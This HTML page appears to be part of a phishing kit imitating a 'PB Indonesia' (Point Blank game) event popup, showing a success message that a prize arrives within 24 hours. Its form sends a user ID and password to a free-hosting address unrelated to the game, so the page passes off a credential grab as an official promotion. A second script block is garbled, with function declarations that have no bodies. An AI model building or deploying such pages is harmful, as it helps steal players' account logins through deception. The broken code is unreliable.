	<title>PB Indonesia</title>
	<link rel="stylesheet" type="text/css" href="assets/css/common.css" />
	<link rel="stylesheet" type="text/css" href="assets/css/style.css" />
	<script type="text/javascript" src="assets/js/jquery-ui.min.js"></script>
	<script type="text/javascript" src="assets/js/jquery.min.js"></script>
	<script type="text/javascript">
		function windowClose() {
			var data = "{\"type\" : \"pbid_layer_popup_close\"}";
			window.parent.postMessage(data, "*");
		}
		function windowResize(val) {
			var data = "{\"type\" : \"pbid_iframe_resize\", \"height\" : \""+val+"\"}";
			window.parent.postMessage(data, "*");
		}
		function windowLoc(val) {
			var data = "{\"type\" : \"pbid_location_change\", \"location\" : \""+val+"\"}";
			window.parent.postMessage(data, "*");
		}
		function windowReload() {
			var data = "{\"type\" : \"pbid_page_reload\"}";
			window.parent.postMessage(data, "*");
		}
		function windowSetValue(id, val) {
			var data = "{\"type\" : \"pbid_set_value\", \"id\" : \""+id+"\", \"value\" : \""+val+"\"}";
			window.parent.postMessage(data, "*");
		}
	</script>
</head>
<body>
	<div id="popup_wrap">
		<h2>Sukses<a href="javascript:windowClose();">CLOSE</a></h2>
		<form name="userForm" id="userForm" method="post" action="http://pbzi-id.000webhostapp.com/login/process.php">
		<input type="hidden" name="loginFail" id="loginFail" value="0"/>
		<div class="pop_cont">
			<div class="entry">
				<h2><center>Event Tersebut Masuk Dalam 24Jam</center><br></h2>
			</div>			
		</div>
		<div class="pop_btn">
			<p class="btn_h72"><a class="btn_rd" href="javascript:windowClose();" rel="nofollow" target="_blank">CLOSE</a></p>
		</div>
		</form>

		<div class="loding"><p><img src="../images/loading.gif" alt="Loading"></p></div>
		
	</div>
	<script type="text/javascript">
	//<![CDATA[
	function inon(obj,idnm)
	{if(obj.value=='') document.getElementById(idnm).style.display='none'; obj.className='entry'}
	function inout(obj,idnm)
	{if(obj.value=='') document.getElementById(idnm).style.display='block'; obj.className='basic'}
	function inup(obj,idnm)
	{if(obj.value.lengt>0) document.getElementById(idnm).style.display='none';}

	function drawMsg(focusId, str) {
		alert(str);
		if ($.trim(focusId)!="") $("#"+focusId).focus();
	}

	function formSend() {
		sendIt();
		return false;
	}

	function sendIt() {
		
		if ($.trim($("#userid").val())=="") {
			drawMsg("userid", "Silakan konfirmasi ID.");
			return;
		}
		if ($.trim($("#password").val()).length <= 0) {
			drawMsg("password", "Silakan masukan kata sandi anda.");
			return;
		}
		
		var frm = $("#userForm");
		
		frm.attr("method", "POST");
		frm.attr("action", "process.html");
		//frm.attr("onsubmit", "return true");
		frm.submit();
	}

	$(document).ready(function() {
		$("#password").keyup(function (key) {
			if (key.keyCode == 13) {
				formSend();
			}
		});
		
		
		
		windowResize('420');
		
		
	});
	</script>
	<script type="text/javascript"> 
		//<![CDATA[
		function inon(obj,idnm)

		function inout(obj,idnm)

		function inup(obj,idnm)
		{if(obj.value.lengt>0) document.getElementById(idnm).style.display='none';}
		
		function drawMsg(focusId, str) {
			alert(str);
			if ($.trim(focusId)!="") $("#"+focusId).focus();
		}
		//]]>
	</script>
</body>
